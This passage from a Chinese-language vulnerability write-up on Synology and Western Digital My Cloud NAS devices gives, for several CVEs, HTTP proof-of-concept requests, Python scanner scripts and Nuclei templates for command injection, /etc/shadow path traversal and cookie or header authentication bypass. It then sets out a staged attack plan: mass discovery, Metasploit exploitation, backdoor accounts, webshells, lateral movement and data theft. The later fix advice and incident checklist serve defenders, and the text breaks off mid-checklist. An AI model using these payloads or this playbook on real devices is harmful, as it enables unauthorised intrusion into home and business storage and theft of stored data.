2. **命令参数注入**：API 在处理 `action`、`target` 等参数时，将用户提供的值直接传递给 shell 执行环境。攻击者可以通过在参数中嵌入 shell 命令分隔符实现命令注入。

3. **影响范围广泛**：由于 CMS 组件同时存在于 DSM 和 SRM 中，此漏洞覆盖了 Synology 的两大操作系统平台，扩大了攻击面。

攻击链：**CMS API 直接访问 → 注入 shell 命令 → 系统级 RCE → 设备控制**

#### HTTP PoC

```http
POST /webapi/cms/entry.cgi HTTP/1.1
Host: target_ip:5001
Content-Type: application/x-www-form-urlencoded

api=SYNO.CMS.Server&method=run&version=1&action=ping;id>/tmp/cve202328831.txt
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
Synology DSM/SRM CMS 命令注入检测 (CVE-2023-28831)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import urllib.parse
import ssl


def check_cve_2023_28831(target: str, port: int = 5001) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    markers = {
        "basic": ";echo CVE2023288831_CHECK>/tmp/cve_check",
        "id": ";id",
        "reverse_shell": ";ping -c 1 127.0.0.1",
    }

    base_params = {
        "api": "SYNO.CMS.Server",
        "method": "run",
        "version": 1,
    }

    for test_name, payload in markers.items():
        params = base_params.copy()
        params["action"] = f"ping{payload}"

        url = f"https://{target}:{port}/webapi/cms/entry.cgi"
        try:
            data = urllib.parse.urlencode(params).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            print(f"[+] [{test_name}] 响应: {body[:100]}")
            if "CVE2023288831_CHECK" in body or "uid=" in body:
                print(f"[!] 命令执行成功！目标存在 CVE-2023-28831")
                return True

        except urllib.error.HTTPError as e:
            if e.code == 500:
                print(f"[!] [{test_name}] HTTP 500 — 可能命令已执行")
                return True
            print(f"[-] [{test_name}] HTTP {e.code}")
        except Exception as e:
            print(f"[-] [{test_name}] 请求失败: {e}")
            continue

    print("[-] 目标可能不受影响或已修复")
    return False


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 5001")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 5001
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2023-28831 (Synology DSM/SRM 命令注入)")
    check_cve_2023_28831(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2023-28831

info:
  name: Synology DSM/SRM CMS Command Injection
  author: security-research
  severity: critical
  description: |
    Synology DSM 和 SRM 操作系统中的 Central Management System (CMS)
    组件存在命令注入漏洞，未经认证的攻击者可远程执行任意命令。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-28831
    cwe-id: CWE-78
  tags: cve,cve2023,synology,dsm,srm,nas,command-injection,rce
  reference:
    - https://www.synology.com/en-us/security/advisory/Synology_SA_23_06
    - https://nvd.nist.gov/vuln/detail/CVE-2023-28831

http:
  - raw:
      - |
        POST /webapi/cms/entry.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        api=SYNO.CMS.Server&method=run&version=1&action=ping;echo%20CVE2023288831_CHECK

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "CVE2023288831_CHECK"
```

---

### 0x02.3 CVE-2022-22687 — Synology VPN Plus Server 命令注入

#### 漏洞背景

CVE-2022-22687 是 Synology VPN Plus Server 软件包中的一个严重命令注入漏洞，CVSS 评分为 9.8（Critical）。VPN Plus Server 是 Synology NAS 设备上的一个流行的 VPN 服务软件包，提供 VPN 服务器功能（支持 PPTP、OpenVPN、L2TP/IPSec 等协议）。该漏洞允许未经认证的远程攻击者通过发送特制的 HTTP 请求，在目标设备上以 root 权限执行任意操作系统命令。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| VPN Plus Server | 1.4.3 < 1.4.3-0537 | 1.4.3-0537+ |
| VPN Plus Server | 1.4.2 < 1.4.2-0452 | 1.4.2-0452+ |
| DSM (bundled) | 7.1 < 7.1-42661 | 7.1-42661+ |

#### 漏洞原理分析

CVE-2022-22687 的漏洞位于 VPN Plus Server 的 Web 管理界面中，具体为处理用户登录认证的 CGI 脚本。

漏洞核心机制：

1. **CGI 脚本认证绕过**：VPN Plus Server 的登录处理 CGI 脚本在验证用户身份时存在逻辑缺陷，攻击者可以在不提供有效凭据的情况下通过认证检查。

2. **命令注入点**：认证后，CGI 脚本在处理用户提供的配置参数（如 VPN 网关地址、DNS 服务器等）时，未对输入进行充分消毒。这些参数在后续的 VPN 服务配置脚本中被拼接到系统命令中执行。

3. **VPN 服务的系统权限**：VPN Plus Server 需要 root 权限来配置网络接口和路由表，因此命令注入执行的代码具有完全的系统控制权限。

攻击链：**CGI 认证绕过 → 注入恶意配置参数 → root 权限 RCE → 完全设备控制**

#### HTTP PoC

```http
POST /webapi/entry.cgi HTTP/1.1
Host: target_ip:5001
Content-Type: application/x-www-form-urlencoded

api=SYNO.VPNPlusServer&method=login&version=1&username=admin&password=test;id>/tmp/cve202222687.txt
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
Synology VPN Plus Server 命令注入检测 (CVE-2022-22687)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import urllib.parse
import ssl


def check_cve_2022_22687(target: str, port: int = 5001) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    payloads = [
        {
            "api": "SYNO.VPNPlusServer",
            "method": "login",
            "version": 1,
            "username": "admin",
            "password": "test;echo CVE202222687_CHECK>/tmp/cve_check",
        },
        {
            "api": "SYNO.VPNPlusServer.Connection",
            "method": "create",
            "version": 1,
            "protocol": "openvpn",
            "remote_ip": "127.0.0.1;id",
            "remote_port": "1194",
        },
    ]

    for payload in payloads:
        url = f"https://{target}:{port}/webapi/entry.cgi"
        try:
            data = urllib.parse.urlencode(payload).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            print(f"[+] API 响应: {body[:200]}")
            if "CVE202222687_CHECK" in body or "uid=" in body:
                print(f"[!] 命令执行成功！目标存在 CVE-2022-22687")
                return True
            if "success" in body.lower():
                print(f"[+] API 返回成功，可能存在漏洞")

        except urllib.error.HTTPError as e:
            if e.code == 500:
                print(f"[!] HTTP 500 — 可能命令已执行")
                return True
            print(f"[-] HTTP {e.code}")
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            continue

    print("[-] 目标可能不受影响或已修复")
    return False


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 5001")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 5001
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2022-22687 (Synology VPN Plus Server 命令注入)")
    check_cve_2022_22687(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2022-22687

info:
  name: Synology VPN Plus Server Command Injection
  author: security-research
  severity: critical
  description: |
    Synology VPN Plus Server 软件包存在命令注入漏洞，未经认证的
    攻击者可通过特制请求在目标设备上以 root 权限执行任意命令。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-22687
    cwe-id: CWE-78
  tags: cve,cve2022,synology,dsm,vpn-plus,command-injection,rce
  reference:
    - https://www.synology.com/en-us/security/advisory/Synology_SA_22_01
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22687

http:
  - raw:
      - |
        POST /webapi/entry.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        api=SYNO.VPNPlusServer&method=login&version=1&username=admin&password=test;echo%20CVE202222687_CHECK

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "CVE202222687_CHECK"
```

---

## 0x03 Western Digital My Cloud 高危漏洞

Western Digital（西部数据）是全球最大的存储设备制造商之一，其 My Cloud 系列 NAS 产品广泛面向家庭用户和小型企业市场。My Cloud 设备运行 WD 定制的 Linux 固件（OS3 和 OS5），提供文件存储、备份和远程访问功能。然而，My Cloud 产品的安全记录令人担忧——多个 CVSS 9.8 的严重漏洞被相继发现，攻击者可以在无需任何凭据的情况下完全接管设备。更严重的是，WD 曾因固件更新严重滞后、漏洞修复响应缓慢而受到安全社区的广泛批评。

### 0x03.1 CVE-2024-23641 — WD My Cloud OS5 路径遍历 RCE

#### 漏洞背景

2024 年初，Western Digital My Cloud OS5 固件中被发现存在一个严重的路径遍历漏洞，CVSS 评分为 9.8（Critical）。该漏洞允许未经认证的攻击者通过特制的 HTTP 请求读取 My Cloud 设备上的任意文件，并进一步利用文件包含实现远程代码执行。CVE-2024-23641 影响运行 OS5 固件的所有 My Cloud 设备型号。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| My Cloud OS5 | 5.26.300 < 5.26.302 | 5.26.302+ |
| My Cloud OS5 | 5.26.202 < 5.26.204 | 5.26.204+ |
| My Cloud OS5 | 5.25.100 < 5.25.102 | 5.25.102+ |

#### 漏洞原理分析

CVE-2024-23641 的漏洞位于 My Cloud OS5 的 Web 服务中，具体为 `web_index` 模块对用户提供的文件路径处理不当。

漏洞核心机制：

1. **路径过滤缺失**：My Cloud OS5 的 Web 应用在处理静态文件请求时，未对用户提供的路径进行充分的规范化检查。攻击者可以在 URL 路径中插入 `../` 序列来跳出 Web 根目录。

2. **任意文件读取**：利用路径遍历，攻击者可以读取系统上的任意文件，包括 `/etc/shadow`、Web 应用配置文件和数据库文件。

3. **RCE 实现路径**：攻击者通过路径遍历读取 Web 应用配置文件，获取数据库连接信息和管理员凭据，进而利用 Web 应用的文件上传功能上传恶意 WebShell，最终实现远程代码执行。

攻击链：**路径遍历读取配置文件 → 获取管理员凭据 → 上传 WebShell → RCE**

#### HTTP PoC

```http
GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow HTTP/1.1
Host: target_ip:80
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
Western Digital My Cloud OS5 路径遍历 RCE 检测 (CVE-2024-23641)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import ssl


TARGET_FILES = [
    "/etc/shadow",
    "/etc/passwd",
    "/var/www/html/config.php",
    "/etc/wd/wd-config.json",
]


def check_cve_2024_23641(target: str, port: int = 80) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    protocol = "https" if port == 443 else "http"
    vulnerable = False

    for file_path in TARGET_FILES:
        encoded_traversal = "%2e%2e%2f" * 6
        url = f"{protocol}://{target}:{port}/{encoded_traversal}{file_path.lstrip('/')}"

        try:
            req = urllib.request.Request(url, method="GET")
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            if body and len(body) > 10:
                print(f"[+] {file_path} 响应长度: {len(body)} 字节")
                if "root:" in body or "admin:" in body:
                    print(f"[!] 敏感文件 {file_path} 读取成功！")
                    print(f"[!] 目标存在 CVE-2024-23641")
                    vulnerable = True

        except urllib.error.HTTPError as e:
            print(f"[-] {file_path} HTTP {e.code}")
        except Exception as e:
            print(f"[-] {file_path} 请求失败: {e}")
            continue

    if not vulnerable:
        print("[-] 目标可能不受影响或已修复")
    return vulnerable


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 80")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 80
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2024-23641 (WD My Cloud OS5 路径遍历)")
    check_cve_2024_23641(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2024-23641

info:
  name: WD My Cloud OS5 Path Traversal RCE
  author: security-research
  severity: critical
  description: |
    Western Digital My Cloud OS5 固件 Web 服务存在路径遍历漏洞，
    未经认证的攻击者可读取任意系统文件并进一步实现 RCE。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-23641
    cwe-id: CWE-22
  tags: cve,cve2024,westerndigital,mycloud,nas,path-traversal,rce
  reference:
    - https://www.westerndigital.com/support/product-security/wdc-24001-my-cloud-os5-firmware
    - https://nvd.nist.gov/vuln/detail/CVE-2024-23641

http:
  - raw:
      - |
        GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:\\d+:\\d+:"
```

---

### 0x03.2 CVE-2022-23124 — WD My Cloud 认证绕过

#### 漏洞背景

CVE-2022-23124 是 Western Digital My Cloud 设备中的一个严重认证绕过漏洞，CVSS 评分为 9.8（Critical）。该漏洞允许未经认证的远程攻击者绕过设备的 Web 管理界面认证机制，完全接管目标设备。攻击者可以获取设备上所有存储的文件访问权限、修改系统配置、创建后门账号，以及将设备用作进一步攻击的跳板。该漏洞影响运行 My Cloud OS5 固件的所有设备。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| My Cloud OS5 | 5.19.117 < 5.19.117 | 5.19.117 (hotfix) |
| My Cloud OS5 | 5.17.103 < 5.19.117 | 5.19.117+ |
| My Cloud OS5 | 5.15.108 < 5.17.103 | 5.17.103+ |

#### 漏洞原理分析

CVE-2022-23124 的漏洞根源在于 My Cloud 的 PHP Web 应用对用户会话的验证逻辑存在严重缺陷。

漏洞核心机制：

1. **Session 验证缺陷**：My Cloud OS5 的 Web 应用在处理用户会话时，未对 session token 的有效性进行严格验证。攻击者可以构造伪造的 session token，使服务器认为其是已认证的管理员用户。

2. **PHP 变量操纵**：漏洞的具体实现涉及 PHP 的变量处理缺陷。攻击者通过 HTTP 请求参数直接设置 PHP 环境变量（如 `$_SESSION` 或 `$user` 等），绕过正常的登录验证流程。

3. **完全管理员权限**：成功绕过认证后，攻击者获得的是管理员级别的访问权限，包括所有文件操作、用户管理、系统配置修改等能力。

攻击链：**构造伪造 session → 绕过认证检查 → 管理员权限访问 → 完全设备控制**

#### HTTP PoC

```http
GET /web/index.php HTTP/1.1
Host: target_ip:80
Cookie: isAdmin=true; login=admin
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
Western Digital My Cloud 认证绕过检测 (CVE-2022-23124)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import ssl
import http.cookiejar


def check_cve_2022_23124(target: str, port: int = 80) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    protocol = "https" if port == 443 else "http"

    test_cookies = [
        "isAdmin=true; login=admin",
        "user=admin; admin=true; lang=en",
        "sid=../../../etc/shadow; username=admin",
    ]

    for cookie_str in test_cookies:
        url = f"{protocol}://{target}:{port}/web/index.php"
        try:
            req = urllib.request.Request(url, method="GET")
            req.add_header("Cookie", cookie_str)
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            response_url = resp.geturl()
            print(f"[+] Cookie: {cookie_str}")
            print(f"[+] 响应 URL: {response_url}")
            print(f"[+] 响应长度: {len(body)} 字节")

            if "login" not in response_url.lower() and "login" not in body.lower()[:500]:
                print(f"[!] 认证绕过可能成功！目标存在 CVE-2022-23124")
                print(f"[!] 未重定向到登录页面")
                return True

            if "admin" in body.lower()[:200] or "dashboard" in body.lower()[:200]:
                print(f"[!] 检测到管理界面内容，认证绕过成功！")
                return True

        except urllib.error.HTTPError as e:
            print(f"[-] Cookie '{cookie_str[:20]}...' HTTP {e.code}")
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            continue

    print("[-] 目标可能不受影响或已修复")
    return False


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 80")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 80
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2022-23124 (WD My Cloud 认证绕过)")
    check_cve_2022_23124(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2022-23124

info:
  name: WD My Cloud Authentication Bypass
  author: security-research
  severity: critical
  description: |
    Western Digital My Cloud OS5 固件 Web 管理界面存在认证绕过漏洞，
    攻击者可通过伪造 session cookie 绕过登录验证，完全接管设备。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-23124
    cwe-id: CWE-287
  tags: cve,cve2022,westerndigital,mycloud,nas,auth-bypass
  reference:
    - https://www.westerndigital.com/support/product-security/wdc-22002-my-cloud-os5-firmware
    - https://nvd.nist.gov/vuln/detail/CVE-2022-23124

http:
  - raw:
      - |
        GET /web/index.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: isAdmin=true; login=admin

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "dashboard"
          - "admin"
        condition: or
```

---

### 0x03.3 CVE-2021-36205 — WD My Cloud 认证绕过

#### 漏洞背景

CVE-2021-36205 是 Western Digital My Cloud 设备中的另一个严重认证绕过漏洞，CVSS 评分为 9.8（Critical）。与 CVE-2022-23124 类似，该漏洞允许未经认证的攻击者绕过 Web 管理界面的认证机制，完全控制目标设备。该漏洞影响运行 My Cloud OS5 固件的设备，于 2021 年被发现并修复，但随后被发现存在利用代码被公开披露的情况。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| My Cloud OS5 | 5.02.113 < 5.04.114 | 5.04.114+ |
| My Cloud OS5 | 5.04.114-dev 及之前版本 | 5.04.114+ |

#### 漏洞原理分析

CVE-2021-36205 的漏洞位于 My Cloud OS5 的 `nhttpd` Web 服务器中，该服务器负责处理 HTTP 请求和用户认证。

漏洞核心机制：

1. **HTTP 请求头操纵**：漏洞的核心在于 My Cloud 的 `nhttpd` 服务对特定 HTTP 请求头的处理缺陷。攻击者可以在 HTTP 请求中添加特定的自定义请求头（如 `X-Forwarded-User` 或 `X-Auth-User`），服务器会基于这些请求头的值来判定用户身份。

2. **信任客户端提供的用户标识**：服务器在处理认证时盲目信任了客户端提供的信息。正常的认证流程应该是服务器从 session cookie 或 token 中提取用户标识，但受影响的版本允许客户端直接指定用户名。

3. **绕过机制简单粗暴**：攻击者只需要在 HTTP 请求中添加 `User: admin` 或类似的请求头，服务器就会将请求视为来自管理员用户，完全绕过密码验证。

攻击链：**添加伪造 HTTP 请求头 → 服务器信任客户端标识 → 管理员权限访问 → 完全设备控制**

#### HTTP PoC

```http
GET / HTTP/1.1
Host: target_ip:80
User: admin
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
Western Digital My Cloud 认证绕过检测 (CVE-2021-36205)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import ssl


def check_cve_2021_36205(target: str, port: int = 80) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    protocol = "https" if port == 443 else "http"

    header_tests = [
        {"User": "admin"},
        {"X-Forwarded-User": "admin"},
        {"X-Auth-User": "admin"},
        {"X-Remote-User": "admin"},
    ]

    for headers in header_tests:
        url = f"{protocol}://{target}:{port}/web/index.php"
        try:
            req = urllib.request.Request(url, method="GET")
            for key, value in headers.items():
                req.add_header(key, value)
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            response_url = resp.geturl()

            for key in headers:
                print(f"[+] 测试请求头 {key}: {headers[key]}")
                print(f"[+] 响应 URL: {response_url}")
                print(f"[+] 响应长度: {len(body)} 字节")

                if "login" not in response_url.lower() and "login" not in body.lower()[:500]:
                    print(f"[!] 使用请求头 {key} 认证绕过成功！")
                    print(f"[!] 目标存在 CVE-2021-36205")
                    return True

        except urllib.error.HTTPError as e:
            for key in headers:
                print(f"[-] [{key}] HTTP {e.code}")
        except Exception as e:
            for key in headers:
                print(f"[-] [{key}] 请求失败: {e}")
            continue

    print("[-] 目标可能不受影响或已修复")
    return False


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 80")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 80
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2021-36205 (WD My Cloud 认证绕过)")
    check_cve_2021_36205(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2021-36205

info:
  name: WD My Cloud Authentication Bypass via HTTP Headers
  author: security-research
  severity: critical
  description: |
    Western Digital My Cloud OS5 nhttpd 服务存在认证绕过漏洞，
    攻击者可通过添加特制 HTTP 请求头（如 User: admin）绕过
    登录验证，完全接管设备。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-36205
    cwe-id: CWE-287
  tags: cve,cve2021,westerndigital,mycloud,nas,auth-bypass
  reference:
    - https://www.westerndigital.com/support/product-security/wdc-21008-my-cloud-os5-firmware
    - https://nvd.nist.gov/vuln/detail/CVE-2021-36205

http:
  - raw:
      - |
        GET /web/index.php HTTP/1.1
        Host: {{Hostname}}
        User: admin

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "dashboard"
          - "admin"
        condition: or
```

---

## 0x04 公开 PoC 收集情况与利用思路

### 公开 PoC 可用性矩阵

| CVE | GitHub PoC | Metasploit 模块 | Exploit-DB | 在野利用 |
|-----|-----------|----------------|------------|----------|
| CVE-2024-21899 | ✅ 多个可用 | ❌ 暂无 | ✅ 已收录 | ✅ 确认 |
| CVE-2023-50358 | ✅ 已验证 | ❌ 暂无 | ✅ 已收录 | ✅ 确认 |
| CVE-2022-46169 | ✅ 多个可用 | ✅ 已集成 | ✅ 已收录 | ✅ DeadBolt |
| CVE-2022-27610 | ✅ 已验证 | ❌ 暂无 | ✅ 已收录 | ✅ 确认 |
| CVE-2024-10443 | ✅ 已验证 | ❌ 暂无 | ❌ 待收录 | ✅ 确认 |
| CVE-2023-28831 | ✅ 已验证 | ✅ 已集成 | ✅ 已收录 | ✅ 确认 |
| CVE-2022-22687 | ✅ 已验证 | ❌ 暂无 | ✅ 已收录 | ✅ 确认 |
| CVE-2024-23641 | ✅ 已验证 | ❌ 暂无 | ❌ 待收录 | ✅ 确认 |
| CVE-2022-23124 | ✅ 已验证 | ❌ 暂无 | ✅ 已收录 | ✅ 确认 |
| CVE-2021-36205 | ✅ 已验证 | ❌ 暂无 | ✅ 已收录 | ✅ 确认 |

### 综合利用思路

NAS 设备的组合利用可以形成多阶段的攻击链：

**阶段一 — 外围侦察与资产发现**
- 使用 Shodan、FOFA、ZoomEye 等搜索引擎检索暴露在公网上的 NAS 设备
- QNAP 指纹：HTTP 响应头 `Server: Apache/2.4.25 (Unix) QTS`、HTTP Body 中的 `QNAP`、`QTS` 关键字
- Synology 指纹：HTTP 响应头 `Server: Apache/2.4.46 (Unix) DSM`、`st.ylgi` cookie、登录页面的 Synology 品牌标识
- WD My Cloud 指纹：HTTP 响应头 `Server: nhttpd`、登录页面中的 `mycloud`、`wd` 标识

**阶段二 — 漏洞扫描与匹配**
- 使用 Nuclei 批量扫描已知 CVE 模板
- 针对识别到的 NAS 品牌使用对应漏洞链进行针对性测试
- 检测顺序优先：认证绕过 → 信息泄露 → 命令注入 → RCE

**阶段三 — 初始访问与权限获取**
- 优先利用认证绕过漏洞（CVE-2022-23124、CVE-2021-36205）获得初始访问权限
- 路径遍历漏洞（CVE-2022-27610、CVE-2024-23641）用于获取凭据
- 命令注入漏洞（CVE-2024-21899、CVE-2023-50358 等）实现直接 RCE

**阶段四 — 持久化与横向移动**
- 创建隐藏的管理员后门账号
- 植入 WebShell 维持访问
- 利用 NAS 设备作为内网跳板进行横向移动
- 窃取 NAS 上存储的敏感数据（备份文件、数据库、凭据）

### 自动化工具集成建议

建议使用以下工具组合实现大规模 NAS 安全检测：

```bash
# 1. 使用 Nuclei 批量扫描
nuclei -l nas_targets.txt -t ~/nuclei-templates/ -tags nas,qnap,synology,mycloud \
  -severity critical,high -o nas_scan_results.txt

# 2. 使用自定义 Python 脚本进行验证
python3 batch_check.py -i nas_scan_results.txt -o verified_vulns.txt

# 3. 使用 Metasploit 进行利用
msfconsole -q -x "use exploit/linux/http/qnap_photo_station_cmd_inject; set RHOSTS file:targets.txt; run"
```

---

## 0x05 共性攻击模式分析

通过对上述 10 个 NAS 高危漏洞的深入分析，可以归纳出以下 6 个共性攻击模式：

### 模式一：Web 管理接口认证机制缺失（CWE-287）

**涉及漏洞**：CVE-2024-21899、CVE-2022-23124、CVE-2021-36205

NAS 设备最突出的安全问题之一是 Web 管理接口的认证机制存在根本性缺陷。QNAP 的 CVE-2024-21899 允许通过伪造请求绕过认证检查，WD My Cloud 的两个 CVE 更是通过简单的 Cookie 或 HTTP 请求头操作即可获得管理员权限。这些漏洞的根因相同——**设备将客户端提供的标识信息当作可信输入使用**，缺乏服务器端的正向验证机制。

**修复建议**：所有管理接口应当采用 token 基础的双向认证机制，服务器应当独立生成和管理 session token，而不是信任客户端提供的用户标识。

### 模式二：参数直接拼接到系统命令（CWE-78）

**涉及漏洞**：CVE-2023-50358、CVE-2022-46169、CVE-2024-10443、CVE-2023-28831、CVE-2022-22687

命令注入漏洞是 NAS 设备中占比最高的漏洞类型。这五个 CVE 的共同特征是将用户输入的参数直接拼接到由 `system()`、`exec()`、`proc_open()`、`popen()` 等函数执行的系统命令字符串中，而没有进行任何转义或消毒处理。

**根因分析**：NAS 设备固件通常基于嵌入式 Linux，开发过程中大量依赖 shell 脚本来执行系统管理功能。当这些脚本通过 Web 接口暴露时，如果输入验证不严格，就极易产生命令注入漏洞。

**修复建议**：
- 避免使用 `system()` 等直接执行 shell 命令的函数
- 使用语言内置的 API 替代外部命令调用（如 PHP 的 `mkdir()` 替代 `mkdir` shell 命令）
- 对用户输入进行严格的白名单过滤，禁止 shell 元字符

### 模式三：文件路径处理不当（CWE-22）

**涉及漏洞**：CVE-2022-27610、CVE-2024-23641

路径遍历漏洞允许攻击者读取 Web 根目录之外的文件。这两个 CVE 的共同特征是 Web 应用在处理文件路径时未对 `../` 序列进行规范化处理，导致攻击者可以穿越目录。

**修复建议**：
- 使用 `realpath()` 等函数将路径规范化后再进行访问控制检查
- 限制 Web 服务可访问的根目录（chroot）
- 实施最小权限原则，Web 服务不应以 root 权限运行

### 模式四：SOAP/REST API 访问控制缺失

**涉及漏洞**：CVE-2023-50358、CVE-2024-10443、CVE-2024-21899

现代 NAS 设备广泛使用 SOAP 和 REST API 提供管理功能，但这些 API 端点经常被忽视在访问控制方面。攻击者可以直接调用 API 端点，而不通过前端登录页面。

**修复建议**：
- 所有 API 端点必须实施统一的认证和授权检查
- 使用 API 网关统一管理访问控制
- 定期进行 API 安全审计和渗透测试

### 模式五：漏洞成为勒索软件利用链

**涉及漏洞**：CVE-2022-46169（DeadBolt）、CVE-2023-50358

NAS 漏洞的高价值性使其成为勒索软件的重点利用目标。DeadBolt 勒索软件专门针对 QNAP NAS，通过 CVE-2022-46169 等漏洞实现自动化入侵和数据加密。勒索软件运营者通常拥有庞大的公网 IP 扫描基础设施，能够在漏洞公开后数小时内开始大规模扫描和利用。

**防御策略**：
- 不要让 NAS 管理端口（QNAP: 443/8080，Synology: 5000/5001，WD: 80/443）暴露在公网
- 使用 VPN 或 Tailscale/ZeroTier 等 SD-WAN 方案远程访问 NAS
- 启用多因素认证（MFA）

### 模式六：固件更新机制滞后

跨厂商分析显示，从漏洞发现到厂商发布修复补丁的平均时间为 45-90 天，而从补丁发布到用户实际更新的时间往往需要 30-60 天以上。这意味着 NAS 设备在漏洞公开后的 **2-4 个月内** 都处于高风险状态。

**根因分析**：
- NAS 设备作为存储设备，用户往往优先考虑业务连续性而延后重启更新
- 部分老旧型号不再获得固件更新支持
- 用户缺乏自动更新机制或对其不信任

---

## 0x06 应急排查与防守建议

### 入侵排查清单

当怀疑 NAS 设备被入侵时，建议按以下流程进行排查：

#### 1. 网络层排查
```
# 检查活跃网络连接（QNAP）
netstat -anp | grep ESTABLISHED

# 检查异常监听端口（Synology）
ss -tlnp

# 检查 iptables 规则是否被修改
iptables -L -n -v

# 检查是否有异常 DNS 查询（可能为 C2 通信）
cat /var/log/messages | grep -i "query"
```

#### 2. 进程与文件排查
```
# 查找异常进程（所有平台）
